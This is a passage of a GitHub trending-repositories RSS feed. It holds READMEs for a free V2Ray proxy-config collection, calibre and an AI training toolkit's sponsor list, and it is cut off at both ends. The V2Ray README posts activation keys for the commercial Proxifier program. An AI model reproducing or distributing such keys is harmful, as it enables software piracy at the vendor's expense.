&lt;p&gt;This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft trademarks or logos is subject to and must follow &lt;a href="https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general"&gt;Microsoft's Trademark &amp;amp; Brand Guidelines&lt;/a&gt;. Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship. Any use of third-party trademarks or logos are subject to those third-party's policies.&lt;/p&gt; 
&lt;h2&gt;‚ö° Responsible AI&lt;/h2&gt; 
&lt;p&gt;This project has been evaluated and certified to comply with the Microsoft Responsible AI Standard. The team will continue to monitor and maintain the repository, addressing any severe issues, including potential harms, if they arise.&lt;/p&gt; 
&lt;h2&gt;‚ö° License&lt;/h2&gt; 
&lt;p&gt;This project is licensed under the MIT License. See the &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/LICENSE"&gt;LICENSE&lt;/a&gt; file for details.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Epodonios/v2ray-configs</title>
      <link>https://github.com/Epodonios/v2ray-configs</link>
      <description>&lt;p&gt;Free vless-vmess-shadowsocks-trojan-xray-V2ray Configs Updating Every 5 minutes&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src="https://img.shields.io/github/last-commit/barry-far/V2ray-Configs.svg?sanitize=true" alt="GitHub last commit" /&gt; &lt;a href="https://lbesson.mit-license.org/"&gt;&lt;img src="https://img.shields.io/badge/License-MIT-blue.svg?sanitize=true" alt="MIT license" /&gt;&lt;/a&gt; &lt;a href="https://github.com/Epodonios/V2ray-Configs/actions/workflows/main.yml"&gt;&lt;img src="https://github.com/barry-far/V2ray-Configs/actions/workflows/main.yml/badge.svg?sanitize=true" alt="Update Configs" /&gt;&lt;/a&gt; &lt;img src="https://img.shields.io/github/repo-size/Epodonios/V2ray-Configs" alt="GitHub repo size" /&gt;&lt;/p&gt; 
&lt;a href="https://t.me/+IOG0nSifAV03ZmY0" target="_blank"&gt; &lt;img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" alt="Telegram" width="500" height="500" /&gt; contact us &lt;/a&gt; 
&lt;h1&gt;Bulk V2ray Configs&lt;/h1&gt; 
&lt;p&gt;üíª This repository contains a collection of free V2ray configuration files that you can use with your V2ray client to access the internet securely and anonymously. This script collects several thousand V2ray configurations every five minutes, and you can receive and use the protocol in base 64, normal, or split format.&lt;/p&gt; 
&lt;h3&gt;Supported Protocols:&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Vmess&lt;/li&gt; 
 &lt;li&gt;Vless&lt;/li&gt; 
 &lt;li&gt;Trojan&lt;/li&gt; 
 &lt;li&gt;Tuic&lt;/li&gt; 
 &lt;li&gt;Shadowsocks&lt;/li&gt; 
 &lt;li&gt;ShadowsocksR&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;You can use a v2ray client to use these subscription links:&lt;/h3&gt; 
&lt;h4&gt;Android:&lt;/h4&gt; 
&lt;p&gt;v2rayng&lt;/p&gt; 
&lt;h4&gt;IOS:&lt;/h4&gt; 
&lt;ol&gt; 
 &lt;li&gt;fair&lt;/li&gt; 
 &lt;li&gt;streisand&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h4&gt;Windows and Linux:&lt;/h4&gt; 
&lt;ol&gt; 
 &lt;li&gt;hiddify-next&lt;/li&gt; 
 &lt;li&gt;nekoray&lt;/li&gt; 
 &lt;li&gt;v2rayn&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Subscriptions Links&lt;/h2&gt; 
&lt;h3&gt;Here are the subscription links at your disposal:&lt;/h3&gt; 
&lt;p&gt;All collected configs:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://github.com/Epodonios/v2ray-configs/raw/main/All_Configs_Sub.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If the above link doesn't work, try the base 64 configurations:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://github.com/Epodonios/v2ray-configs/raw/main/All_Configs_base64_Sub.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Splited by protocol:&lt;/h3&gt; 
&lt;p&gt;Vless:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://github.com/Epodonios/v2ray-configs/raw/main/Splitted-By-Protocol/vless.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Vmess:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://github.com/Epodonios/v2ray-configs/raw/main/Splitted-By-Protocol/vmess.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ss:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://github.com/Epodonios/v2ray-configs/raw/main/Splitted-By-Protocol/ss.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ssr:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://github.com/Epodonios/v2ray-configs/raw/main/Splitted-By-Protocol/ssr.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Trojan:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://github.com/Epodonios/v2ray-configs/raw/main/Splitted-By-Protocol/trojan.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Splited in 250 count of configs:&lt;/h3&gt; 
&lt;p&gt;Config List 1:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub1.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 2:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub2.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 3:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub3.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 4:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub4.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 5:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub5.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 6:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub6.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 7:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub7.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 8:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub8.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 9:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub9.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 10:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub10.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 11:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub11.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 12:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub12.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 13:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub13.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Config List 14:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/Sub14.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Usage:&lt;/h3&gt; 
&lt;p&gt;Mobile and pc:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;Copy the links provided and go to your v2ray clients subscription setting and paste metioned link and save that.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Occasionally use the subscription update function in your v2ray client to stay up-to-date ü§ù.&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;I hope u use this configs very well.&lt;/p&gt; 
&lt;h1&gt;V2Ray Config Scanner&lt;/h1&gt; 
&lt;p&gt;A lightweight Python script that scans and pings a list of V2Ray configuration links (vmess, vless, etc.), and outputs their protocol and latency. Useful for testing and sorting multiple V2Ray configs based on performance.&lt;/p&gt; 
&lt;h2&gt;Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Supports &lt;code&gt;vmess&lt;/code&gt;, vless, and other V2Ray protocols&lt;/li&gt; 
 &lt;li&gt;Measures latency (ping) for each config&lt;/li&gt; 
 &lt;li&gt;Sorts or filters results based on protocol and responsiveness&lt;/li&gt; 
 &lt;li&gt;Simple, fast, and dependency-free (only requires Python)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Requirements&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Python 3.x (no external packages required)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;Make sure Python 3 is installed on your system.&lt;/li&gt; 
 &lt;li&gt;Download the sub*.txt files from this repository (they contain lists of V2Ray subscription links).&lt;/li&gt; 
 &lt;li&gt;Run the script and provide the path to one or more sub*.txt files as arguments.&lt;/li&gt; 
 &lt;li&gt;The script will start scanning and show you the protocol and ping for each config.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Sample Output&lt;/p&gt; 
&lt;p&gt;[vmess] node1.example.com - 42 ms [vless] node2.example.net - timeout [shadowsocks] fastnode.org - 35 ms&lt;/p&gt; 
&lt;h2&gt;Tunnel entire system:&lt;/h2&gt; 
&lt;p&gt;For better use and tunneling the entire system, you can use a proxy program. The usage steps are as follows:&lt;/p&gt; 
&lt;h3&gt;Usage Instructions:&lt;/h3&gt; 
&lt;p&gt;1-First, install the Proxifier program.&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://proxifier.com/download/"&gt;https://proxifier.com/download/&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;2-Activate the program:&lt;/p&gt; 
&lt;p&gt;Activation keys:&lt;/p&gt; 
&lt;p&gt;Portable Edition:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;L6Z8A-XY2J4-BTZ3P-ZZ7DF-A2Q9C
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Standard Edition:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;  5EZ8G-C3WL5-B56YG-SCXM9-6QZAP
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Mac OS:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt; P427L-9Y552-5433E-8DSR3-58Z68
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;3-Go to the Profile section and select the Proxy Server. In the displayed section, click on Add.&lt;/p&gt; 
&lt;p&gt;4-Enter the following information:&lt;/p&gt; 
&lt;p&gt;IP: Enter 127.0.0.1&lt;/p&gt; 
&lt;p&gt;Port: Depending on the version you are using, enter:&lt;/p&gt; 
&lt;p&gt;V2rayN: 10808&lt;/p&gt; 
&lt;p&gt;Netch: 2801&lt;/p&gt; 
&lt;p&gt;SSR: 1080&lt;/p&gt; 
&lt;p&gt;Mac V2rayU: 1086&lt;/p&gt; 
&lt;p&gt;Protocol: Select SOCKS5&lt;/p&gt; 
&lt;p&gt;5-Enjoy!&lt;/p&gt; 
&lt;p&gt;Some installed programs on the system, like Spotube, might not fully tunnel. This issue can be resolved with this method.&lt;/p&gt; 
&lt;p&gt;Your friend, EPODONIOS&lt;/p&gt; 
&lt;h2&gt;u can use this feature with another way it no needs any program set by system tools&lt;/h2&gt; 
&lt;h3&gt;instruction:&lt;/h3&gt; 
&lt;p&gt;1- open your OS setting&lt;/p&gt; 
&lt;p&gt;2- go to proxy section&lt;/p&gt; 
&lt;p&gt;3- in proxy section set this values : ip : 127.0.0.1&lt;/p&gt; 
&lt;p&gt;port : 10809&lt;/p&gt; 
&lt;p&gt;local host :&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;localhost;127.*;10.*;172.16.*;172.17.*;172.18.*;172.19.*;172.20.*;172.21.*;172.22.*;172.23.*;172.24.*;172.25.*;172.26.*;172.27.*;172.28.*;172.29.*;172.30.*;172.31.*;192.168.*
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;4- then set it up with ON key&lt;/p&gt; 
&lt;p&gt;5- back to v2rayn and after set your config turn it to set system proxy&lt;/p&gt; 
&lt;p&gt;6- now your system tunneled entirely&lt;/p&gt; 
&lt;p&gt;ur friend,EPODONIOS&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>kovidgoyal/calibre</title>
      <link>https://github.com/kovidgoyal/calibre</link>
      <description>&lt;p&gt;The official source code repository for the calibre ebook manager&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;calibre&lt;/h1&gt; 
&lt;img align="left" src="https://raw.githubusercontent.com/kovidgoyal/calibre/master/resources/images/lt.png" height="200" width="200" /&gt; 
&lt;p&gt;calibre is an e-book manager. It can view, convert, edit and catalog e-books in all of the major e-book formats. It can also talk to e-book reader devices. It can go out to the internet and fetch metadata for your books. It can download newspapers and convert them into e-books for convenient reading. It is cross platform, running on Linux, Windows and macOS.&lt;/p&gt; 
&lt;p&gt;For more information, see the &lt;a href="https://calibre-ebook.com/about"&gt;calibre About page&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://github.com/kovidgoyal/calibre/actions?query=workflow%3ACI"&gt;&lt;img src="https://github.com/kovidgoyal/calibre/workflows/CI/badge.svg?sanitize=true" alt="Build Status" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Screenshots&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://calibre-ebook.com/demo"&gt;Screenshots page&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;p&gt;See the &lt;a href="https://manual.calibre-ebook.com"&gt;User Manual&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Development&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://manual.calibre-ebook.com/develop.html"&gt;Setting up a development environment for calibre&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;A &lt;a href="https://calibre-ebook.com/dist/src"&gt;tarball of the source code&lt;/a&gt; for the current calibre release.&lt;/p&gt; 
&lt;h2&gt;Bugs&lt;/h2&gt; 
&lt;p&gt;Bug reports and feature requests should be made in the calibre bug tracker at &lt;a href="https://bugs.launchpad.net/calibre"&gt;Launchpad&lt;/a&gt;. GitHub is only used for code hosting and pull requests.&lt;/p&gt; 
&lt;h2&gt;Support calibre&lt;/h2&gt; 
&lt;p&gt;calibre is a result of the efforts of many volunteers from all over the world. If you find it useful, please consider contributing to support its development. &lt;a href="https://calibre-ebook.com/donate"&gt;Donate to support calibre development&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Building calibre binaries&lt;/h2&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/kovidgoyal/calibre/master/bypy/README.rst"&gt;Build instructions&lt;/a&gt; for instructions on how to build the calibre binaries and installers for all the platforms calibre supports.&lt;/p&gt; 
&lt;h2&gt;calibre package versions in various repositories&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://repology.org/project/calibre/versions"&gt;&lt;img src="https://repology.org/badge/vertical-allrepos/calibre.svg?columns=3&amp;amp;header=calibre" alt="Packaging Status" /&gt;&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>ostris/ai-toolkit</title>
      <link>https://github.com/ostris/ai-toolkit</link>
      <description>&lt;p&gt;The ultimate training toolkit for finetuning diffusion models&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;AI Toolkit by Ostris&lt;/h1&gt; 
&lt;p&gt;AI Toolkit is an all in one training suite for diffusion models. I try to support all the latest models on consumer grade hardware. Image and video models. It can be run as a GUI or CLI. It is designed to be easy to use but still have every feature imaginable.&lt;/p&gt; 
&lt;h2&gt;Support My Work&lt;/h2&gt; 
&lt;p&gt;If you enjoy my projects or use them commercially, please consider sponsoring me. Every bit helps! üíñ&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://github.com/orgs/ostris"&gt;Sponsor on GitHub&lt;/a&gt; | &lt;a href="https://www.patreon.com/ostris"&gt;Support on Patreon&lt;/a&gt; | &lt;a href="https://www.paypal.com/donate/?hosted_button_id=9GEFUKC8T9R9W"&gt;Donate on PayPal&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Current Sponsors&lt;/h3&gt; 
&lt;p&gt;All of these people / organizations are the ones who selflessly make this project possible. Thank you!!&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Last updated: 2025-12-17 22:19 UTC&lt;/em&gt;&lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://x.com/NuxZoe" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://pbs.twimg.com/profile_images/1919488160125616128/QAZXTMEj_400x400.png" alt="a16z" width="280" height="280" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/replicate" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/60410876?v=4" alt="Replicate" width="280" height="280" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/huggingface" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/25720743?v=4" alt="Hugging Face" width="280" height="280" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;hr style="width:100%;border:none;height:2px;background:#ddd;margin:30px 0;" /&gt; 
&lt;p align="center"&gt; &lt;a href="https://www.pixelcut.ai/" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://pbs.twimg.com/profile_images/1496882159658885133/11asz2Sc_400x400.jpg" alt="Pixelcut" width="200" height="200" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/weights-ai" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/185568492?v=4" alt="Weights" width="200" height="200" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/josephrocca" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/1167575?u=92d92921b4cb5c8c7e225663fed53c4b41897736&amp;amp;v=4" alt="josephrocca" width="200" height="200" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c8.patreon.com/4/200/93304/J" alt="Joseph Rocca" width="200" height="200" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/161471720/dd330b4036d44a5985ed5985c12a5def/eyJ3IjoyMDB9/1.jpeg?token-hash=k1f4Vv7TevzYa9tqlzAjsogYmkZs8nrXQohPCDGJGkc%3D" alt="Vladimir Sotnikov" width="200" height="200" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/33158543/C" alt="clement Delangue" width="200" height="200" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/8654302/b0f5ebedc62a47c4b56222693e1254e9/eyJ3IjoyMDB9/2.jpeg?token-hash=suI7_QjKUgWpdPuJPaIkElkTrXfItHlL8ZHLPT-w_d4%3D" alt="Misch Strotz" width="200" height="200" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;/p&gt; 
&lt;hr style="width:100%;border:none;height:2px;background:#ddd;margin:30px 0;" /&gt; 
&lt;p align="center"&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/120239481/49b1ce70d3d24704b8ec34de24ec8f55/eyJ3IjoyMDB9/1.jpeg?token-hash=o0y1JqSXqtGvVXnxb06HMXjQXs6OII9yMMx5WyyUqT4%3D" alt="nitish PNR" width="150" height="150" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/152118848/3b15a43d71714552b5ed1c9f84e66adf/eyJ3IjoyMDB9/1.png?token-hash=MKf3sWHz0MFPm_OAFjdsNvxoBfN5B5l54mn1ORdlRy8%3D" alt="Kristjan Retter" width="150" height="150" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/2298192/1228b69bd7d7481baf3103315183250d/eyJ3IjoyMDB9/1.jpg?token-hash=opN1e4r4Nnvqbtr8R9HI8eyf9m5F50CiHDOdHzb4UcA%3D" alt="Mohamed Oumoumad" width="150" height="150" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/548524/S" alt="Steve Hanff" width="150" height="150" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/8449560/P" alt="Patron" width="150" height="150" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/169502989/220069e79ce745b29237e94c22a729df/eyJ3IjoyMDB9/1.png?token-hash=E8E2JOqx66k2zMtYUw8Gy57dw-gVqA6OPpdCmWFFSFw%3D" alt="Timothy Bielec" width="150" height="150" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;/p&gt; 
&lt;hr style="width:100%;border:none;height:2px;background:#ddd;margin:30px 0;" /&gt; 
&lt;p align="center"&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/9547341/bb35d9a222fd460e862e960ba3eacbaf/eyJ3IjoyMDB9/1.jpeg?token-hash=Q2XGDvkCbiONeWNxBCTeTMOcuwTjOaJ8Z-CAf5xq3Hs%3D" alt="Travis Harrington" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/5021048/c6beacab0fdb4568bf9f0d549aa4bc44/eyJ3IjoyMDB9/1.jpeg?token-hash=JTEtFVzUeU7pQw4R3eSn6rGgqgi44uc2rDBAv6F6A4o%3D" alt="Infinite " width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://x.com/NuxZoe" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://pbs.twimg.com/profile_images/1916482710069014528/RDLnPRSg_400x400.jpg" alt="tungsten" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/E2GO" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/1776669?u=bf52b2691fa7d1e421d6167b804a2c1cf3b229e7&amp;amp;v=4" alt="E2GO" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c8.patreon.com/4/200/7478272/T" alt="Totoro " width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://clwill.com/" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://images.squarespace-cdn.com/content/v1/63d444727a5d5f304f89eebe/c9def9ce-3824-404d-a8bb-96b6236338ca/favicon.ico?format=100w" alt="Christopher Williams" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;a href="http://www.ir-ltd.net" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://pbs.twimg.com/profile_images/1602579392198283264/6Tm2GYus_400x400.jpg" alt="IR-Entertainment Ltd" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/27288932/6c35d2d961ee4e14a7a368c990791315/eyJ3IjoyMDB9/1.jpeg?token-hash=TGIto_PGEG2NEKNyqwzEnRStOkhrjb3QlMhHA3raKJY%3D" alt="David Garrido" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/33228112/J" alt="Jimmy Simmons" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://www.runcomfy.com/trainer/ai-toolkit/app" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://pbs.twimg.com/profile_images/1747828425736273922/nlPQTDYO_400x400.jpg" alt="RunComfy" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c8.patreon.com/4/200/55206617/X" alt="xv" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/3712451/432e22a355494ec0a1ea1927ff8d452e/eyJ3IjoyMDB9/7.jpeg?token-hash=OpQ9SAfVQ4Un9dSYlGTHuApZo5GlJ797Mo0DtVtMOSc%3D" alt="David Shorey" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/80767260/1fa7b3119f9f4f40a68452e57de59bfe/eyJ3IjoyMDB9/1.jpeg?token-hash=H34Vxnd58NtbuJU1XFYPkQnraVXSynZHSL3SMMcdKbI%3D" alt="nuliajuk" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/40761075/R" alt="Randy McEntee" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/98811435/3a3632d1795b4c2b9f8f0270f2f6a650/eyJ3IjoyMDB9/1.jpeg?token-hash=657rzuJ0bZavMRZW3XZ-xQGqm3Vk6FkMZgFJVMCOPdk%3D" alt="EmmanuelMr18" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/93348210/5c650f32a0bc481d80900d2674528777/eyJ3IjoyMDB9/1.jpeg?token-hash=0jiknRw3jXqYWW6En8bNfuHgVDj4LI_rL7lSS4-_xlo%3D" alt="Armin Behjati" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/155963250/6f8fd7075c3b4247bfeb054ba49172d6/eyJ3IjoyMDB9/1.png?token-hash=z81EHmdU2cqSrwa9vJmZTV3h0LG-z9Qakhxq34FrYT4%3D" alt="Un Defined" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/squewel" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/97603184?v=4" alt="squewel" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c8.patreon.com/4/200/27791680/J" alt="Jean-Tristan Marin" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/570742/4ceb33453a5a4745b430a216aba9280f/eyJ3IjoyMDB9/1.jpg?token-hash=nPcJ2zj3sloND9jvbnbYnob2vMXRnXdRuujthqDLWlU%3D" alt="Al H" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/82763/f99cc484361d4b9d94fe4f0814ada303/eyJ3IjoyMDB9/1.jpeg?token-hash=A3JWlBNL0b24FFWb-FCRDAyhs-OAxg-zrhfBXP_axuU%3D" alt="Doron Adler" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/103077711/bb215761cc004e80bd9cec7d4bcd636d/eyJ3IjoyMDB9/2.jpeg?token-hash=3U8kdZSUpnmeYIDVK4zK9TTXFpnAud_zOwBRXx18018%3D" alt="John Dopamine" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/99036356/7ae9c4d80e604e739b68cca12ee2ed01/eyJ3IjoyMDB9/3.png?token-hash=ZhsBMoTOZjJ-Y6h5NOmU5MT-vDb2fjK46JDlpEehkVQ%3D" alt="njgnfhahfnhnwir" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/141098579/1a9f0a1249d447a7a0df718a57343912/eyJ3IjoyMDB9/2.png?token-hash=_n-AQmPgY0FP9zCGTIEsr5ka4Y7YuaMkt3qL26ZqGg8%3D" alt="The Local Lab" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a 